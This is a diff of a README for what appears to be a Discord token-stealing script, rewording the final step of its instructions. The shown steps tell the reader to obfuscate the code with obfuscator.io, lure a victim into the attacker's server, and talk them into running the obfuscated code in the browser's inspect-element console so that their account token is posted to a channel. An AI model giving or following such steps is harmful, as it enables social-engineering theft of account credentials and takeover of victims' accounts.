@@ -23,6 +23,6 @@ Follow the steps below to make the script work:
 
 4. Go to https://obfuscator.io and paste in the full code and then get the new code that is obsfucated.
 
-5. Convince a user to join that server and execute the obsfucated code inside of the inspect element console. This should make the user 
-      send their token.
+5. Convince a user to join your created server and execute the obsfucated code inside of the inspect element console. This should make the user 
+      send their token in the provided channel.
 
